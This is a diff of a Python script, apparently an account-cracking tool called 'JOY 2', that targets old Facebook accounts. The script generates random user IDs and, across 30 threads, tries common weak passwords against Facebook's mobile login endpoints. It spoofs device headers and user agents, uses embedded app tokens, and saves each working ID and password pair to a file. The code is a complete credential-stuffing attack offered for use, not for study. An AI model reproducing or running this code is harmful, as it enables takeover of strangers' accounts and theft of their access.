@@ -2,324 +2,91 @@ import os
 import re
 import time
 import uuid
-import hashlib
 import random
-import string
 import requests
 import sys
-import json
-import urllib
-from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
-from os import system
-from datetime import datetime
-def linex(self):
-	print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
 # Global variables
-method = []
 oks = []
-cps = []
 loop = 0
-user = []
 
-# Color codes for terminal output
-X = '\x1b[1;37m'
+# Color codes
 rad = '\x1b[38;5;196m'
-G = '\x1b[38;5;46m'
-Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
-RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
-W = '\x1b[1;37m'
+G   = '\x1b[38;5;46m'
+Y   = '\x1b[38;5;220m'
+W   = '\x1b[1;37m'
 
 
-def windows():
-    """
-    Generates a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
-def window1():
-    """
-    Generates another variant of a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
-    latest_build = rr(6000, 9000)
-    latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
-
-# Set window title
-sys.stdout.write('\x1b]2;𓆩【JOY 】𓆪 \x07')
-
-
-    # JOY Clover Logo - Green - Version 2.5
-def ____banner____():
-    if 'win' in sys.platform:
-        os.system('cls')
-    else:
-        os.system('clear')
-    
-    print("""\033[1;32m
-        
-░░░░░██╗░█████╗░██╗░░░██╗
-░░░░░██║██╔══██╗╚██╗░██╔╝
-░░░░░██║██║░░██║░╚████╔╝░
-██╗░░██║██║░░██║░░╚██╔╝░░
-╚█████╔╝╚█████╔╝░░░██║░░░
-░╚════╝░░╚════╝░░░░╚═╝░░░
-\033[0m""")
+def mobile_agent():
+    chrome_ver = random.choice(range(120, 140))
+    build = rr(5000, 9000)
+    patch = rr(50, 250)
+    android_ver = random.choice(['12', '13', '14'])
+    model = random.choice([
+        'SM-G991B', 'SM-A536B', 'Pixel 8', 'Pixel 8 Pro',
+        'Redmi Note 13 Pro', 'OnePlus 12', 'POCO F5', 'Xiaomi 14',
+        'SM-S908B', 'SM-A346B', 'Pixel 7a', 'OnePlus Nord 3'
+    ])
+    agents = [
+        f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.39.109;]",
+        f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36",
+        f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36",
+        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_{rr(0,4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    ]
+    return random.choice(agents)
 
 
 def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
-    if len(uid) == 15:
-        if uid.startswith('1000000000'):
-            return '2009'
-        if uid.startswith('100000000'):
-            return '2009'
-        if uid.startswith('10000000'):
-            return '2009'
-        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
-            return '2010'
-        if uid.startswith('100001'):
-            return '2010'
-        if uid.startswith(('100002', '100003')):
-            return '2011'
-        if uid.startswith('100004'):
-            return '2012'
-        if uid.startswith(('100005', '100006')):
-            return '2013'
-        if uid.startswith(('100007', '100008')):
-            return '2014'
-        if uid.startswith('100009'):
-            return '2015'
-        if uid.startswith('10001'):
-            return '2016'
-        if uid.startswith('10002'):
-            return '2017'
-        if uid.startswith('10003'):
-            return '2018'
-        if uid.startswith('10004'):
-            return '2019'
-        if uid.startswith('10005'):
-            return '2020'
-        if uid.startswith('10006'):
-            return '2021'
-        if uid.startswith('10009'):
-            return '2023'
-        if uid.startswith(('10007', '10008')):
-            return '2022'
-        return ''
-    elif len(uid) in (9, 10):
-        return '2008'
-    elif len(uid) == 8:
-        return '2007'
+    uid = str(uid)
+    if len(uid) <= 3:
+        return '2004'
+    elif len(uid) in (4, 5):
+        return '2004-2005'
+    elif len(uid) == 6:
+        return '2005'
     elif len(uid) == 7:
         return '2006'
-    elif len(uid) == 14 and uid.startswith('61'):
-        return '2024'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) in (9, 10):
+        return '2008'
     else:
-        return ''
-
-
-def clear():
-    os.system('clear')
+        return 'OLD'
 
 
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 
-def BNG_71_():
-    """
-    Main menu function.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
-    linex()
-    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-    if __Jihad__ in ('A', 'a', '01', '1'):
-        old_clone()
+def banner():
+    if 'win' in sys.platform:
+        os.system('cls')
     else:
-        print(f"\n    {rad}Choose Valid Option... ")
-        time.sleep(2)
-        BNG_71_()
-
-
-def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
+        os.system('clear')
+    print("""\033[1;32m
+░░░░░██╗░█████╗░██╗░░░██╗  ██████╗
+░░░░░██║██╔══██╗╚██╗░██╔╝  ╚════██╗
+░░░░░██║██║░░██║░╚████╔╝░   █████╔╝
+██╗░░██║██║░░██║░░╚██╔╝░░  ██╔═══╝░
+╚█████╔╝╚█████╔╝░░░██║░░░  ███████╗
+░╚════╝░░╚════╝░░░░╚═╝░░░  ╚══════╝
+\033[0m""")
+    print(f"       {W}[ {G}2004-2008 VERY OLD ID CLONE TOOL{W} ]")
     linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
-    linex()
-    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-    if _input in ('A', 'a', '01', '1'):
-        old_One()
-    elif _input in ('B', 'b', '02', '2'):
-        old_Tow()
-    elif _input in ('C', 'c', '03', '3'):
-        old_Tree()
-    else:
-        print(f"\n[×]{rad} Choose Value Option... ")
-        BNG_71_()
-
-
-def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    star = '10000'
-    for _ in range(int(limit)):
-        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
-        user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for mal in user:
-            uid = star + mal
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    prefixes = ['100003', '100004']
-    for _ in range(int(limit)):
-        prefix = random.choice(prefixes)
-        suffix = ''.join(random.choices('0123456789', k=9))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
-    linex()
-    prefix = '10000000'
-    for _ in range(int(limit)):
-        suffix = ''.join(random.choices('0123456789', k=8))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
 
 
 def login_1(uid):
-    """
-    Login attempt method 1.
-    """
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mJOY-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(
+            f"\r {W}[{rad}M1{W}] LOOP:{G}{loop}{W} | OK:{G}{len(oks)}{W} | TRYING: {Y}{uid}{W}  "
+        )
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '1234567', '12345678', '123456789', '000000', '111111'):
+            ua = mobile_agent()
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -344,72 +111,174 @@ def login_1(uid):
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             headers = {
-                'User-Agent': window1(),
+                'User-Agent': ua,
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'Host': 'b-graph.facebook.com',
+                'X-FB-Net-HNI': str(rr(20000, 40000)),
+                'X-FB-SIM-HNI': str(rr(20000, 40000)),
+                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'MOBILE.5G', 'WIFI']),
                 'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
+                'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
+                'x-fb-device-group': str(rr(4096, 6144)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+                'x-fb-connection-token': uuid.uuid4().hex,
+                'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
+                'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate',
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            res = session.post(
+                'https://b-graph.facebook.com/auth/login',
+                data=data, headers=headers,
+                allow_redirects=False, timeout=15
+            ).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mJOY\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/JOY-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
+                open('JOY2-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mJOY\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/JOY-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
+                open('JOY2-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
     except Exception:
-        time.sleep(5)
+        time.sleep(3)
 
 
 def login_2(uid):
-    """
-    Login attempt method 2.
-    """
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mJOY-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-    
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+    global loop
+    sys.stdout.write(
+        f"\r {W}[{rad}M2{W}] LOOP:{G}{loop}{W} | OK:{G}{len(oks)}{W} | TRYING: {Y}{uid}{W}  "
+    )
+    sys.stdout.flush()
+    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '000000', '111111'):
         try:
             with requests.Session() as session:
+                ua = mobile_agent()
                 headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                    'User-Agent': ua,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
                     'x-fb-sim-hni': str(rr(20000, 40000)),
                     'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
+                    'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
+                    'x-fb-connection-type': random.choice([
+                        'cell.CTRadioAccessTechnologyLTE',
+                        'cell.CTRadioAccessTechnologyNRNSA',
+                        'WIFI',
+                    ]),
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-device-group': str(rr(4096, 6144)),
+                    'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
+                    'x-fb-connection-token': uuid.uuid4().hex,
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate',
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
+                url = (
+                    f"https://b-api.facebook.com/method/auth.login"
+                    f"?format=json&email={uid}&password={pw}"
+                    f"&credentials_type=device_based_login_password"
+                    f"&generate_session_cookies=1"
+                    f"&error_detail_type=button_with_disabled"
+                    f"&source=device_based_login"
+                    f"&meta_inf_fbmeta=%20&currently_logged_in_userid=0"
+                    f"&method=GET&locale=en_US&client_country_code=US"
+                    f"&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler"
+                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
+                )
+                po = session.get(url, headers=headers, timeout=15).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mJOY\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/JOY-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
+                    open('JOY2-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mJOY\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/JOY-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception as e:
+        except Exception:
             pass
     loop += 1
 
+
+def main():
+    user = []
+    banner()
+    print(f"       {W}({rad}1{W}) {G}2004  {W}→ ID range: {Y}1 – 9999")
+    linex()
+    print(f"       {W}({rad}2{W}) {G}2005  {W}→ ID range: {Y}10000 – 999999")
+    linex()
+    print(f"       {W}({rad}3{W}) {G}2006  {W}→ ID range: {Y}1000000 – 9999999")
+    linex()
+    print(f"       {W}({rad}4{W}) {G}2007  {W}→ ID range: {Y}10000000 – 99999999")
+    linex()
+    print(f"       {W}({rad}5{W}) {G}2008  {W}→ ID range: {Y}100000000 – 999999999")
+    linex()
+    print(f"       {W}({rad}A{W}) {G}ALL   {W}→ {Y}2004-2008 MIX RANGE")
+    linex()
+
+    year_sel = input(f"       {W}[{rad}★{W}] SELECT YEAR {W}: {Y}").strip().upper()
+
+    year_ranges = {
+        '1': (1, 9999),
+        '2': (10000, 999999),
+        '3': (1000000, 9999999),
+        '4': (10000000, 99999999),
+        '5': (100000000, 999999999),
+    }
+
+    banner()
+    limit = input(f"       {W}[{rad}★{W}] TOTAL ID COUNT (ex: 5000) {W}: {Y}").strip()
+    linex()
+
+    try:
+        limit_int = int(limit)
+    except ValueError:
+        print(f"    {rad}Invalid number. Exiting.")
+        time.sleep(2)
+        return
+
+    if year_sel == 'A':
+        all_ranges = list(year_ranges.values())
+        for _ in range(limit_int):
+            lo, hi = random.choice(all_ranges)
+            user.append(str(rr(lo, hi)))
+    elif year_sel in year_ranges:
+        lo, hi = year_ranges[year_sel]
+        for _ in range(limit_int):
+            user.append(str(rr(lo, hi)))
+    else:
+        print(f"\n    {rad}Invalid selection.")
+        time.sleep(2)
+        return
+
+    print(f"       {W}({rad}A{W}) {G}METHOD A")
+    linex()
+    print(f"       {W}({rad}B{W}) {G}METHOD B")
+    linex()
+    meth = input(f"       {W}[{rad}★{W}] CHOICE {W}(A/B): {Y}").strip().upper()
+
+    with tred(max_workers=30) as pool:
+        banner()
+        print(f"       {W}[{rad}★{W}] TOTAL IDS  {W}: {G}{limit_int}")
+        print(f"       {W}[{rad}★{W}] SERIES     {W}: {G}2004-2008 VERY OLD")
+        print(f"       {W}[{rad}★{W}] METHOD     {W}: {G}{meth}")
+        print(f"       {W}[{rad}★{W}] OUTPUT     {W}: {Y}JOY2-OLD-M{'1' if meth=='A' else '2'}-OK.txt")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+        print(f"\n\n       {W}[{G}DONE{W}] Total OK: {G}{len(oks)}")
+        linex()
+
+
 if __name__ == '__main__':
-    BNG_71_()
+    main()
